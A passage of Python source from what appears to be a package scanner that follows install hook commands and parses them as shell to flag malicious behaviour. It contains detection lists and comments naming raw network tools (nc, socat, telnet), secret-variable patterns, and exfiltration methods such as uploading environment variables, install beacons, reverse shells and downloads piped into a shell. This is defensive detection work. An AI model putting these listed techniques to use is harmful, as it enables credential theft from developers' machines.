    (&& || ; | & parentheses) as their own tokens. Never raises."""
    tokens = _hook_shlex(cmd)
    if tokens is None:                     # unbalanced quotes: best effort
        return _HOOK_FALLBACK_TOKEN_RE.findall(cmd)
    return tokens


def _local_module(value):
    return bool(value) and (value.startswith(("./", "../", "/")) or bool(_SCRIPT_EXT_RE.search(value)))


def _node_script_at(args):
    """-> (index of the script, preloads, code) for `node [flags] script
    [args]`: code is the inline code of -e / --eval / -p / --print (None when
    there is none); the index is None when there is no script."""
    preloads, i = [], 0
    while i < len(args):
        a = args[i]
        if a == "--":
            return (i + 1 if i + 1 < len(args) else None), preloads, None
        if a.startswith("-") and a != "-":
            name, eq, val = a.partition("=")
            if name in _NODE_CODE_FLAGS:
                return None, preloads, (val if eq else (args[i + 1] if i + 1 < len(args) else ""))
            if name in _NODE_VALUE_FLAGS:
                value = val if eq else (args[i + 1] if i + 1 < len(args) else "")
                if name in _NODE_PRELOAD_FLAGS and _local_module(value):
                    preloads.append(value)
                i += 1 if eq else 2
                continue
            i += 1
            continue
        return i, preloads, None
    return None, preloads, None


def _node_script(args):
    """-> (script, preloads, code) for `node [flags] script [args]` (see
    _node_script_at)."""
    at, preloads, code = _node_script_at(args)
    return (None if at is None else args[at]), preloads, code


def _runtime_script(args, runs):
    """-> (script, preloads, code) for a JavaScript runtime other than node
    (_JS_RUNTIMES): node's reading of its words, a subcommand in `runs`
    skipped, the script kept only when it names a file."""
    at, preloads, code = _node_script_at(args)
    if at is not None and args[at] in runs:
        more_at, more, code = _node_script_at(args[at + 1:])
        preloads = preloads + more
        at = None if more_at is None else at + 1 + more_at
    script = None if at is None else args[at]
    if script is not None and not (script.startswith(("./", "../", "/")) or _RUNTIME_SCRIPT_RE.search(script)):
        script = None
    return script, preloads, code


def _interpreter_script(args, inline_flags=("-c",)):
    """-> (script, inline_code) for `sh|python [flags] script` / `-c code`."""
    i = 0
    while i < len(args):
        a = args[i]
        if a in inline_flags:
            return None, (args[i + 1] if i + 1 < len(args) else "")
        if a == "-m" and i + 1 < len(args):                     # python -m pkg.mod
            return args[i + 1].replace(".", "/") + ".py", None
        if a in ("-o", "-O", "-W", "-X") and i + 1 < len(args):
            i += 2
            continue
        if a.startswith("-") and a != "-":
            i += 1
            continue
        return a, None
    return None, None


# Following a hook is bounded (review: a 16 MB hook of `cd a;` took hours, one
# of `env ` minutes, and one of `cd a && node b.js && …` made gigabytes of
# targets): a hook longer than HOOK_MAX_CHARS is not followed, at most
# HOOK_MAX_COMMANDS commands (those in `sh -c` / `env -S` code too) and
# HOOK_MAX_TARGETS scripts are, and a script path longer than HOOK_MAX_PATH is
# dropped. follow_hook says when a limit stopped it; the registry then counts
# the release as not fully scanned (a real hook is a line or two).
HOOK_MAX_CHARS = 100_000
HOOK_MAX_COMMANDS = 1000
HOOK_MAX_TARGETS = 100
HOOK_MAX_PATH = 4096
_REDIRECT_TOKEN_RE = re.compile(r"\d?[<>]{1,2}&?\d?")
_DUP_FD_RE = re.compile(r"&\d$")
_FD_NUMBER_RE = re.compile(r"[0-9]+")
# A wrapper's options that take a value (the next word, `--name=value`, or the
# rest of a short option: `-Cdir`), the ones among them that change the
# directory the command runs in, and those whose value is a command line.
_WRAPPER_VALUE_OPTIONS = {
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
    "sudo": frozenset({"-u", "--user", "-g", "--group", "-h", "--host", "-p", "--prompt",
                       "-C", "--close-from", "-D", "--chdir", "-r", "--role", "-t", "--type",
                       "-T", "--command-timeout", "-U", "--other-user"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "exec": frozenset({"-a"}),
    "time": frozenset({"-f", "--format", "-o", "--output"}),
    "dotenv": frozenset({"-e", "-v", "-p"}),
}
_WRAPPER_CHDIR_OPTIONS = {"env": frozenset({"-C", "--chdir"}), "sudo": frozenset({"-D", "--chdir"})}
_WRAPPER_COMMAND_OPTIONS = {"env": frozenset({"-S", "--split-string"})}


class _HookWalk:
    """What following one hook has used, and whether a limit stopped it."""
    __slots__ = ("commands", "complete")

    def __init__(self):
        self.commands, self.complete = 0, True


def _apply_path(comps, path):
    """posixpath.normpath's loop for relative `path`, applied to the list of
    components kept so far (in place): '' and '.' are dropped, and '..'
    removes the component before it unless there is none or it is '..' too.
    normpath(a + '/' + b) is b applied to a's components, so a `cd` costs only
    its own length (the whole path was normalized again at every one)."""
    for comp in path.split("/"):
        if comp in ("", "."):
            continue
        if comp != ".." or not comps or comps[-1] == "..":
            comps.append(comp)
        else:
            comps.pop()
    return comps


def _hook_cd(where, dest):
    """The directory after `cd dest` from `where` ((set, components): set is
    False while no `cd` has named a directory), or None for a destination
    the walk cannot follow (~, -, $VAR). An absolute path counts from the
    package root."""
    if not dest or dest in ("~", "-") or dest.startswith(("$", "~")):
        return None
    dest = dest.replace("\\", "/")
    if dest.startswith("/"):
        raw = dest.lstrip("/")
        return raw not in ("", "."), _apply_path([], raw)
    comps = _apply_path(list(where[1]), dest)
    return bool(comps), comps


def _hook_segment_targets(tokens, depth, walk):
    """Targets of one tokenized command line; tracks `cd` across segments."""
    targets = []
    state = (False, [])                       # the directory `cd` moved to
    joined = {}

    def join(path, where=None):
        """core's normpath(join(cwd, path)) when a `cd` has set a directory
        (`where`: this command's own, from env -C / sudo -D)."""
        path = path.replace("\\", "/")
        is_set, comps = where if where is not None else state
        if not is_set or path.startswith("/"):
            return path
        if where is not None:
            return "/".join(_apply_path(list(comps), path)) or "."
        if path not in joined:              # (cleared at every cd)
            joined[path] = "/".join(_apply_path(list(comps), path)) or "."
        return joined[path]

    def flush(seg):
        nonlocal state
        words, skip = [], False
        for tok in seg:
            if skip:
                skip = False
                continue
            if tok in _HOOK_REDIRECTS or _REDIRECT_TOKEN_RE.fullmatch(tok):
                skip = not _DUP_FD_RE.search(tok)
                if words and _FD_NUMBER_RE.fullmatch(words[-1]):
                    words.pop()                 # 2>/dev/null: the 2 is the redirect's
                continue
            words.append(tok)
        if not words:
            return
        if walk.commands >= HOOK_MAX_COMMANDS:
            walk.complete = False
            return
        walk.commands += 1
        # env assignments and wrappers (with their options) in front
        i, where = 0, None
        while i < len(words):
            word = words[i]
            if _ENV_ASSIGN_RE.match(word):
                i += 1
                continue
            name = word.lower()
            if name not in _HOOK_WRAPPERS:
                break
            i += 1
            values = _WRAPPER_VALUE_OPTIONS.get(name, frozenset())
            while i < len(words) and words[i].startswith("-") and (words[i] != "-" or name == "env"):
                opt = words[i]
                i += 1
                if opt == "--":
                    break
                if opt.startswith("--"):
                    key, eq, value = opt.partition("=")
                    if key not in values:
                        continue
                    if not eq:
                        value = words[i] if i < len(words) else ""
                        i += 1
                elif opt[:2] in values:
                    key, value = opt[:2], opt[2:]
                    if not value:
                        value = words[i] if i < len(words) else ""
                        i += 1
                else:
                    continue
                if key in _WRAPPER_CHDIR_OPTIONS.get(name, ()):
                    where = _hook_cd(where or state, value) or where
                elif key in _WRAPPER_COMMAND_OPTIONS.get(name, ()):
                    if depth < 2:                   # env -S "node x.js": a command line
                        targets.extend(join(t, where) for t in _hook_targets(value, depth + 1, walk))
                    return
        if i >= len(words):
            return
        head = words[i].replace("\\", "/")
        base = head.rsplit("/", 1)[-1].lower()
        if base in ("cd", "pushd"):
            dest = next((w for w in words[i + 1:] if not w.startswith("-")), "")
            moved = _hook_cd(state, dest)
            if moved is not None:
                state = moved
                joined.clear()
            return
        script, extra, code = None, [], None
        if base in _NODE_NAMES:
            script, extra, code = _node_script(words[i + 1:])
        elif base in _JS_RUNTIMES:
            script, extra, code = _runtime_script(words[i + 1:], _JS_RUNTIMES[base])
        elif base in _SHELL_NAMES or _PYTHON_NAME_RE.match(base):
            script, inline = _interpreter_script(words[i + 1:])
            if inline and depth < 2 and base in _SHELL_NAMES:
                targets.extend(join(t, where) for t in _hook_targets(inline, depth + 1, walk))
        elif head.startswith(("./", "../")) or ("/" in head and not head.startswith("/")) \
                or _SCRIPT_EXT_RE.search(head):
            script = head                       # executed directly (shebang)
        for t in [script] + extra:
            if t:
                targets.append(join(t, where))
        if code:                                # node -e "require('./x')", from this directory
            targets.extend(join(m.group(1), where) for m in _LOCAL_REQUIRE_RE.finditer(code))

    seg = []
    for tok in tokens:
        if tok in _HOOK_SEPARATORS or (tok and set(tok) <= set(";&|()")):
            flush(seg)
            seg = []
        else:
            seg.append(tok)
    flush(seg)
    return targets


def _hook_targets(cmd, depth=0, walk=None):
    walk = walk if walk is not None else _HookWalk()
    targets = []
    variants = [cmd]
    if "\\" in cmd:
        variants.append(cmd.replace("\\", "/"))   # cmd.exe: backslash is a path separator
    for variant in variants:
        targets += _hook_segment_targets(_hook_tokens(variant), depth, walk)
    return targets


def follow_hook(cmd):
    """(targets, complete) for an install hook command: the package-relative
    files it runs, in order and without duplicates — `node install.js`,
    `node ./scripts/x.mjs`, `node install` (no extension: resolve like Node),
    `node --no-warnings x.js`, `node -r ./preload.js x.js`,
    `cd scripts && node x.js`, `sh ./install.sh`, `./install.sh`,
    `python setup_helper.py`, `node scripts\\x.js`,
    `node -e "require('./postinstall')"`, `env -C sub node x.js`,
    `sudo -u me node x.js`, `2>/dev/null node x.js`, `bun run x.js`,
    `deno run -A x.ts`, `tsx x.ts` — and False for complete
    when a limit stopped the walk (see HOOK_MAX_CHARS). The command is
    tokenized like a shell (quotes, && || ; | operators, env assignments,
    cd, wrappers and their options)."""
    if not isinstance(cmd, str) or not cmd.strip():
        return [], True
    if len(cmd) > HOOK_MAX_CHARS:
        return [], False
    walk = _HookWalk()
    targets = _hook_targets(cmd, 0, walk)
    # `node -e` anywhere in the command (`npx node -e …` too), as written
    for m in _NODE_E_RE.finditer(cmd):
        code = next(g for g in m.groups() if g is not None)
        targets += _LOCAL_REQUIRE_RE.findall(code)
    seen, out = set(), []
    for t in targets:
        if t and t not in seen and t not in ("-", "."):
            if len(t) > HOOK_MAX_PATH:
                walk.complete = False
                continue
            seen.add(t)
            out.append(t)
    if len(out) > HOOK_MAX_TARGETS:
        out, walk.complete = out[:HOOK_MAX_TARGETS], False
    return out, walk.complete


def hook_script_targets(cmd):
    """The files an install hook runs (follow_hook's targets)."""
    return follow_hook(cmd)[0]


# ---------------- An install hook's command read as a program (0.1.8) ----------------
# A hook command is a shell program: what it does is read, not the tools it
# names. (0.1.7 made a hook CRITICAL when it merely contained curl, wget,
# eval, base64, `node -e`, `sh -c` or powershell — tokens a hook that only
# fetches a platform binary shares, and one written with other tools avoids;
# they are now only a MAJOR hint.) hook_command_risk reads the command
#   * as a script, by the install-script test (install_script_risk: a
#     download piped into or substituted into a shell, the environment or
#     credentials sent, encoded PowerShell, a reverse shell, persistence …);
#   * through the code it hands an interpreter inline, read the same way:
#     `node -e/-p` and `python -c` code, and `sh -c`, `eval` and `cmd /c`
#     command lines (_SH_MAX_DEPTH deep);
#   * through its network commands, parsed as a shell parses them
#     (_sh_parse: quotes, escapes, $(…) and `…`, pipes, redirections,
#     && || ; &, and `if`/`while`/`!` in front):
#     - local data sent (_SH_DATA_REASONS): a file uploaded (curl
#       -d/--data*/--json/-F with @file or <file, -T/--upload-file, wget
#       --post-file/--body-file, `< file` or `cat file |` into the command);
#       what a command that reports on the machine prints (whoami, hostname,
#       id, uname -a/-n, env, printenv, cat, ls, pwd, ps, ifconfig …, in
#       $(…) or `…` in the request, or piped into it through filters such
#       as base64); an environment variable naming the user or the host
#       ($USER, $HOSTNAME, %USERNAME%, $env:COMPUTERNAME …) or a secret
#       ($NPM_TOKEN, $AWS_SECRET_ACCESS_KEY …). A request that keeps what it
#       downloads (to a file, a pipe, a substitution) may name platform
#       selectors, versions and paths in its address ($(uname -s),
#       $npm_package_version, $HOME) and a secret in its headers (a token
#       for a private download): of those, only the user or host name
#       counts.
#     - a beacon (_SH_BEACON_REASON): a request whose answer is thrown away
#       (to /dev/null: -o, -O, >; wget --spider; or to the terminal an
#       install runs without) or a lookup of a name (nslookup, dig, host,
#       ping): its only effect is to tell a server the package was
#       installed, and where. A request whose exit status decides what runs
#       next (`curl -sf URL >/dev/null && node dl.js || node build.js`) is a
#       connectivity check; `|| true`, `|| :`, `&& echo …` decide nothing.
#       Loopback addresses and reserved names (localhost, .local, .test,
#       .invalid …: _DNS_LOCAL_TLDS) are not a server elsewhere.
_SH_MAX_DEPTH = 3                # substitutions and inline shell code read inside one another
_SH_HTTP = frozenset({"curl", "wget", "wget2"})
_SH_RAW = frozenset({"nc", "ncat", "netcat", "socat", "telnet"})
_SH_LOOKUP = frozenset({"nslookup", "dig", "host", "ping", "ping6"})
_SH_SHELLS = frozenset({"sh", "bash", "dash", "zsh", "ksh", "ash"})
_SH_EVAL = frozenset({"eval"})
_SH_CMD = frozenset({"cmd"})
# what a command reports about the machine, when its output is sent
_SH_IDENTITY = frozenset({"whoami", "id", "hostname", "logname", "users", "groups", "who", "w"})
_SH_ENVIRONMENT = frozenset({"printenv", "set", "export", "declare"})
_SH_FILE_READERS = frozenset({"cat", "head", "tail", "base64", "xxd", "od", "strings", "gzip", "bzip2", "xz", "tar",
                              "zip", "type", "more", "less", "tac", "nl", "cut"})
_SH_LISTINGS = frozenset({"ls", "dir", "find", "tree", "du", "pwd", "ps", "ifconfig", "ipconfig", "ip", "netstat",
                          "ss", "arp", "route", "systeminfo", "uptime", "df", "mount", "lsblk", "lscpu", "last"})
# filters a pipe carries data through (a file argument of theirs is the source instead)
_SH_FILTERS = frozenset({"base64", "gzip", "bzip2", "xz", "xxd", "od", "tr", "sed", "awk", "cut", "sort", "uniq",
                         "head", "tail", "grep", "jq", "openssl", "rev", "fold", "tee", "cat", "tac", "nl", "strings"})
_SH_SCRIPTED_FILTERS = frozenset({"sed", "awk", "grep", "jq"})     # their first argument is a script, not a file
_SH_ECHO = frozenset({"echo", "printf"})
# xargs' options that take a value (-i and -e take theirs attached, if any)
_SH_XARGS_SHORT_VALUE = frozenset("IndLPsa")
_SH_XARGS_LONG_VALUE = frozenset({"--max-args", "--max-lines", "--delimiter", "--max-procs", "--max-chars",
                                  "--arg-file", "--eof", "--process-slot-var"})
_SH_NOOPS = frozenset({"true", ":", "false", "exit", "echo", "printf", "return"})
_SH_KEYWORDS = frozenset({"if", "then", "else", "elif", "while", "until", "do", "!", "{"})
_SH_STATUS_KEYWORDS = frozenset({"if", "elif", "while", "until", "!"})
# curl's and wget's options that take a value (the next word, `--name=value`,
# or the rest of a short option: -o/dev/null), and what the value is
_SH_CURL_SHORT_VALUE = frozenset("AbcCdDeEFHKmoPQrtTuUwxXyYz")
_SH_CURL_LONG_VALUE = frozenset({
    "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--json", "--form", "--form-string",
    "--header", "--user-agent", "--referer", "--cookie", "--cookie-jar", "--output", "--output-dir", "--upload-file",
    "--url", "--url-query", "--request", "--user", "--proxy", "--proxy-user", "--proxy-header", "--write-out",
    "--max-time", "--connect-timeout", "--retry", "--retry-delay", "--retry-max-time", "--config", "--cacert",
    "--capath", "--cert", "--cert-type", "--key", "--key-type", "--dump-header", "--range", "--continue-at",
    "--resolve", "--connect-to", "--interface", "--limit-rate", "--max-filesize", "--max-redirs", "--oauth2-bearer",
    "--proto", "--proto-redir", "--time-cond", "--trace", "--trace-ascii", "--stderr", "--unix-socket",
    "--dns-servers", "--doh-url", "--variable", "--ciphers", "--local-port", "--speed-limit", "--speed-time",
    "--mail-from", "--mail-rcpt", "--quote", "--telnet-option", "--socks4", "--socks4a", "--socks5",
    "--socks5-hostname", "--noproxy", "--pinnedpubkey", "--netrc-file", "--etag-save", "--etag-compare",
    "--alt-svc", "--hsts", "--aws-sigv4"})
_SH_CURL_DATA = frozenset({"-d", "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode",
                           "--json", "-F", "--form", "--form-string", "--url-query"})
_SH_CURL_META = frozenset({"-H", "--header", "-A", "--user-agent", "-e", "--referer", "-b", "--cookie", "-u",
                           "--user", "--oauth2-bearer", "--proxy-header"})
_SH_CURL_UPLOAD = frozenset({"-T", "--upload-file"})
_SH_CURL_OUTPUT = frozenset({"-o", "--output"})
_SH_CURL_REMOTE_NAME = frozenset({"-O", "--remote-name", "--remote-name-all"})
_SH_WGET_SHORT_VALUE = frozenset("OoaPUtTweiBlADXIQ")
_SH_WGET_LONG_VALUE = frozenset({
    "--output-document", "--output-file", "--append-output", "--directory-prefix", "--user-agent", "--header",
    "--post-data", "--post-file", "--body-data", "--body-file", "--method", "--tries", "--timeout", "--wait",
    "--user", "--password", "--http-user", "--http-password", "--referer", "--input-file", "--load-cookies",
    "--save-cookies", "--execute", "--limit-rate", "--ca-certificate", "--certificate", "--private-key",
    "--bind-address", "--dns-timeout", "--connect-timeout", "--read-timeout", "--level", "--accept", "--reject",
    "--domains", "--quota", "--restrict-file-names", "--progress", "--backups", "--config", "--default-page",
    "--local-encoding", "--remote-encoding", "--base", "--waitretry", "--exclude-directories",
    "--include-directories", "--ca-directory", "--certificate-type", "--private-key-type", "--secure-protocol",
    "--proxy-user", "--proxy-password", "--ftp-user", "--ftp-password"})
_SH_WGET_DATA = frozenset({"--post-data", "--body-data"})
_SH_WGET_META = frozenset({"--header", "-U", "--user-agent", "--referer", "--user", "--http-user", "--password",
                           "--http-password"})
_SH_WGET_UPLOAD = frozenset({"--post-file", "--body-file"})
_SH_WGET_OUTPUT = frozenset({"-O", "--output-document"})
_SH_NULL = frozenset({"/dev/null", "nul", "$null"})
# an environment variable a word names: $NAME, ${NAME}, %NAME%, $env:NAME
_SH_ENV_REF_RE = re.compile(r"\$env:([A-Za-z_][A-Za-z0-9_]*)|\$\{?([A-Za-z_][A-Za-z0-9_]*)|%([A-Za-z_][A-Za-z0-9_]*)%",
                            re.I)
_SH_IDENTITY_VAR_RE = re.compile(r"(?:USER|USERNAME|LOGNAME|HOSTNAME|COMPUTERNAME|USERDOMAIN)\Z", re.I)
_SH_PATH_VAR_RE = re.compile(r"(?:HOME|USERPROFILE|PWD|INIT_CWD)\Z", re.I)
_SH_SECRET_VAR_RE = re.compile(r"TOKEN|SECRET|PASSW|API_?KEY|PRIVATE_?KEY|ACCESS_?KEY|CREDENTIAL|AUTH", re.I)
# a word that addresses a server: a URL, a host name, an address; its host
_SH_URL_RE = re.compile(
    r"""[A-Za-z][A-Za-z0-9+.-]*://[^\s/?#]|[^\s/'"]*\.[A-Za-z]{2,}(?::[0-9]+)?(?:[/?#]|\Z)"""
    r"""|[0-9]{1,3}(?:\.[0-9]{1,3}){3}(?::[0-9]+)?(?:[/?#]|\Z)""")
_SH_HOST_RE = re.compile(r"(?:[A-Za-z][A-Za-z0-9+.-]*://)?(?:[^\s/?#@]*@)?(\[[^\]\s]*\]|[^\s/?#:]*)")
_SH_FLAG_A_OR_N_RE = re.compile(r"-[A-Za-z]*[an][A-Za-z]*\Z")
_SH_BEACON_REASON = "tells a server it was installed (a request whose answer it throws away)"
_SH_DATA_REASONS = {
    "identity": "sends the machine's user or host name over the network",
    "lookup-identity": "sends the machine's user or host name in a DNS lookup of a name it builds",
    "environment": "sends environment variables over the network",
    "file": "uploads a local file over the network",
    "report": "sends what local commands report about the machine over the network",
    "credentials": "sends what the cloud's instance metadata service gives it (the machine's credentials) over the network",
    "address": "sends the machine's public IP address over the network",
}
# commands that assign a shell variable given as their argument (`export T=$(…)`)
_SH_DECLARE = frozenset({"export", "declare", "local", "readonly", "typeset"})
_SH_VAR_NAME_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]*\Z")


class _ShCommand:
    """One simple command of a shell text: its words (quotes removed; a `$`
    that expands nothing is \\x00, such a backtick \\x01), the command substitutions
    each word holds ($(…), `…`: their text, a tuple per word), its
    redirections [(op, target)], whether a pipe feeds it (pipe_in) and
    whether it pipes into the next command (pipe_out), and the operator after
    it (after: '&&', '||', '|', or '' for ; & a line break and the end)."""
    __slots__ = ("words", "subs", "redirs", "pipe_in", "pipe_out", "after")

    def __init__(self, words, subs, redirs, pipe_in, after):
        self.words, self.subs, self.redirs = words, subs, redirs
        self.pipe_in, self.pipe_out, self.after = pipe_in, after == "|", after


def _sh_subst_end(text, i):
    """The index of the `)` that closes the $( opened just before i (else the
    text's length): quotes, escapes and nested parentheses respected."""
    depth, quote, n = 0, None, len(text)
    while i < n:
        ch = text[i]
        if quote is not None:
            if ch == "\\" and quote == '"':
                i += 2
                continue
            if ch == quote:
                quote = None
        elif ch == "\\":
            i += 2
            continue
        elif ch == "'" or ch == '"':
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            if depth == 0:
                return i
            depth -= 1
        i += 1
    return n


def _sh_tick_end(text, i):
    """The index of the backtick that closes the one opened just before i
    (else the text's length)."""
    n = len(text)
    while i < n:
        if text[i] == "\\":
            i += 2
            continue
        if text[i] == "`":
            return i
        i += 1
    return n


_SH_REDIRECT_OPS = ("<<<", "<<-", ">>", ">&", ">|", "<<", "<&", "<>", ">", "<")
_SH_PLAIN_RUN_RE = re.compile(r"""[^ \t\r\n;()&|<>\\'"$`]+""")


def _sh_parse(text):
    """The simple commands of a shell text, in order ([_ShCommand], see
    above): `&& || ; & ( )` and line breaks end a command, `|` and `|&` pipe
    it into the next, `< > >> >| &> &>> <> <<< n> >&n` redirect (a
    here-document's text is not read)."""
    out = []
    words, subs, redirs = [], [], []
    state = {"cur": None, "cur_subs": [], "redir": None, "pipe_in": False}

    def end_word():
        cur = state["cur"]
        if cur is None:
            return
        if state["redir"] is not None:
            redirs.append((state["redir"], cur))
            state["redir"] = None
        else:
            words.append(cur)
            subs.append(tuple(state["cur_subs"]))
        state["cur"], state["cur_subs"] = None, []

    def end_command(after):
        end_word()
        state["redir"] = None
        if words or redirs:
            out.append(_ShCommand(list(words), list(subs), list(redirs), state["pipe_in"], after))
            state["pipe_in"] = after == "|"
        else:
            state["pipe_in"] = False
        words.clear()
        subs.clear()
        redirs.clear()

    i, n = 0, len(text)
    while i < n:
        ch = text[i]
        if ch in " \t\r":
            end_word()
            i += 1
        elif ch in "\n;()":
            end_command("")
            i += 1
        elif ch == "&":
            if text.startswith("&&", i):
                end_command("&&")
                i += 2
            elif text.startswith("&>", i):
                end_word()
                state["redir"] = "&>>" if text.startswith("&>>", i) else "&>"
                i += len(state["redir"])
            else:
                end_command("")
                i += 1
        elif ch == "|":
            if text.startswith("||", i):
                end_command("||")
                i += 2
            else:
                end_command("|")
                i += 2 if text.startswith("|&", i) else 1
        elif ch == "<" or ch == ">":
            cur = state["cur"]
            if cur is not None and cur.isdigit() and cur.isascii() and not state["cur_subs"]:
                state["cur"], state["cur_subs"] = None, []      # 2>/dev/null: the fd number is the redirect's
            else:
                end_word()
            op = next(o for o in _SH_REDIRECT_OPS if text.startswith(o, i))
            state["redir"] = op
            i += len(op)
        else:
            if state["cur"] is None:
                state["cur"] = ""
            plain = _SH_PLAIN_RUN_RE.match(text, i)     # (a run of characters that are themselves: at once)
            if plain is not None:
                state["cur"] += plain.group()
                i = plain.end()
            else:
                i = _sh_word_part(text, i, state)
    end_command("")
    return out


def _sh_word_part(text, i, state):
    """Adds the part of a word at text[i] (a character, an escape, a quoted
    string, a substitution) to state["cur"]; returns the index after it."""
    n, ch = len(text), text[i]
    if ch == "\\":
        if i + 1 < n and text[i + 1] != "\n":
            state["cur"] += _sh_quiet(text[i + 1])
        return i + 2
    if ch == "'":
        j = text.find("'", i + 1)
        j = n if j < 0 else j
        state["cur"] += text[i + 1:j].replace("$", "\x00").replace("`", "\x01")
        return j + 1
    if ch == '"':
        i += 1
        while i < n and text[i] != '"':
            c2 = text[i]
            if c2 == "\\" and i + 1 < n and text[i + 1] in '$`"\\\n':
                nxt = text[i + 1]
                state["cur"] += "" if nxt == "\n" else _sh_quiet(nxt)
                i += 2
            elif c2 == "$" and text.startswith("$(", i) or c2 == "`":
                i = _sh_substitution(text, i, state)
            else:
                state["cur"] += c2
                i += 1
        return i + 1
    if ch == "$" and text.startswith("$(", i) or ch == "`":
        return _sh_substitution(text, i, state)
    state["cur"] += ch
    return i + 1


def _sh_quiet(ch):
    """A character as a word keeps it where it expands nothing: `$` is \\x00,
    a backtick \\x01 (_sh_literal gives them back)."""
    return "\x00" if ch == "$" else ("\x01" if ch == "`" else ch)


def _sh_literal(word):
    """A word as the text it is: what the shell hands a program (`sh -c`,
    `eval`, `node -e` code … read again, where `$` does expand)."""
    return word.replace("\x00", "$").replace("\x01", "`")


def _sh_substitution(text, i, state):
    """Adds the substitution at text[i] ($(…) or `…`) to the word and its
    text to the word's substitutions; returns the index after it."""
    if text[i] == "`":
        j = _sh_tick_end(text, i + 1)
        state["cur_subs"].append(text[i + 1:j])
    else:
        j = _sh_subst_end(text, i + 2)
        state["cur_subs"].append(text[i + 2:j])
    state["cur"] += text[i:j + 1]
    return j + 1


def _sh_name(word):
    """A program's name as a word gives it: lower case, no directory, no .exe."""
    name = word.replace("\\", "/").rsplit("/", 1)[-1].lower()
    return name[:-4] if name.endswith(".exe") and len(name) > 4 else name


def _sh_xargs_command(args):
    """The index in xargs' arguments of the command it runs, else None."""
    k = 0
    while k < len(args):
        a = args[k]
        if a == "--":
            return k + 1 if k + 1 < len(args) else None
        if not a.startswith("-") or a == "-":
            return k
        if a.startswith("--"):
            k += 2 if a in _SH_XARGS_LONG_VALUE else 1
            continue
        letter = a[1:2]
        k += 2 if letter in _SH_XARGS_SHORT_VALUE and len(a) == 2 else 1
    return None


def _sh_program(cmd):
    """(index of the program word or None, its name: lower case, no
    directory, no .exe, whether a keyword in front uses its exit status) of
    a simple command, past environment assignments, `if`/`while`/`!` and
    wrappers (env, sudo, nohup … and their options). A wrapper with no
    command after it is the program (`env` alone prints the environment)."""
    words, i, status, last = cmd.words, 0, False, None
    while i < len(words):
        word = words[i]
        if _ENV_ASSIGN_RE.match(word):
            i += 1
            continue
        if word in _SH_KEYWORDS:
            status = status or word in _SH_STATUS_KEYWORDS
            i += 1
            continue
        name = _sh_name(word)
        if name not in _HOOK_WRAPPERS:
            return i, name, status
        last = (i, name)
        i += 1
        values = _WRAPPER_VALUE_OPTIONS.get(name, frozenset())
        while i < len(words) and words[i].startswith("-") and (words[i] != "-" or name == "env"):
            opt = words[i]
            i += 1
            if opt == "--":
                break
            if opt.startswith("--"):
                if opt.partition("=")[0] in values and "=" not in opt:
                    i += 1
            elif opt[:2] in values and len(opt) == 2:
                i += 1
    if last is not None:
        return last[0], last[1], status
    return None, "", status


def _sh_options(args, short_value, long_value):
    """([(option, value or None, index of the word holding the value)],
    [(positional, index)]) of a command's arguments: `--name value`,
    `--name=value`, `-x value`, `-xvalue` and grouped flags (`-sSLo file`:
    a value option ends the group)."""
    opts, pos, k = [], [], 0
    while k < len(args):
        a = args[k]
        if a == "--":
            pos.extend((x, j) for j, x in enumerate(args[k + 1:], k + 1))
            break
        if a.startswith("--") and len(a) > 2:
            name, eq, value = a.partition("=")
            if name in long_value and not eq:
                opts.append((name, args[k + 1] if k + 1 < len(args) else "", k + 1))
                k += 2
                continue
            opts.append((name, value if eq else None, k))
        elif a.startswith("-") and len(a) > 1:
            for j in range(1, len(a)):
                letter = a[j]
                if letter in short_value:
                    if j + 1 < len(a):
                        opts.append(("-" + letter, a[j + 1:], k))
                    else:
                        opts.append(("-" + letter, args[k + 1] if k + 1 < len(args) else "", k + 1))
                        k += 1
                    break
                opts.append(("-" + letter, None, k))
        else:
            pos.append((a, k))
        k += 1
    return opts, pos


def _sh_code(name, args):
    """The command line a program hands a shell to read again (`sh -c CODE`,
    `eval ARGS`, `cmd /c ARGS`), as its text, else None."""
    if name in _SH_SHELLS:
        code = _sh_c_code(args)
    elif name in _SH_EVAL:
        code = " ".join(args)
    elif name in _SH_CMD and args and args[0].lower() in ("/c", "/k"):
        code = " ".join(args[1:])
    else:
        return None
    return None if code is None else _sh_literal(code)


def _sh_c_code(args):
    """The command line of `sh -c CODE` (flags may be grouped: -ec, -lc), else None."""
    for k, a in enumerate(args):
        if a.startswith("-") and not a.startswith("--") and "c" in a[1:]:
            return args[k + 1] if k + 1 < len(args) else ""
        if not a.startswith("-"):
            return None
    return None


def _sh_word_data(word, subs, depth, download, shvars=None):
    """[(kind, what)]: the local data a word of a request sends (see above):
    what its substitutions print, and the environment variables it names.
    `download`: the word is the address, or a header, of a request that
    keeps its answer, where only the user or host name counts. `shvars`:
    the local data the shell variables the text assigned hold."""
    out = []
    for sub in subs:
        for kind, what in _sh_output_data(sub, depth + 1):
            if not download or kind == "identity":
                out.append((kind, what))
    for m in _SH_ENV_REF_RE.finditer(word):
        name = m.group(1) or m.group(2) or m.group(3)
        if shvars and name in shvars:
            out.extend((kind, what) for kind, what in shvars[name] if not download or kind == "identity")
        elif _SH_IDENTITY_VAR_RE.match(name):
            out.append(("identity", "$" + name))
        elif download:
            continue
        elif _SH_PATH_VAR_RE.match(name):
            out.append(("report", "$" + name))
        elif _SH_SECRET_VAR_RE.search(name):
            out.append(("environment", "$" + name))
    return out


def _sh_output_data(text, depth, shvars=None):
    """[(kind, what)]: the local data shell text prints (the text of a
    substitution: what each of its pipelines prints — `$(hostname; whoami)`
    — back through the filters its last command is piped into)."""
    if depth > _SH_MAX_DEPTH:
        return []
    cmds = _sh_parse(text)
    out = []
    for k, cmd in enumerate(cmds):
        if not cmd.pipe_out:
            out.extend(_sh_piped_data(cmds, k + 1, depth, shvars))
    return out


def _sh_piped_data(cmds, at, depth, shvars=None):
    """[(kind, what)]: the local data piped into cmds[at] (at == len(cmds):
    what the last command prints), back through filters."""
    k = at - 1
    while k >= 0:
        cmd = cmds[k]
        if k < at - 1 and not cmd.pipe_out:
            return []
        found = _sh_command_data(cmd, depth, shvars)
        if found is not None:
            return found
        if not cmd.pipe_in:
            return []
        k -= 1
    return []


def _sh_command_data(cmd, depth, shvars=None):
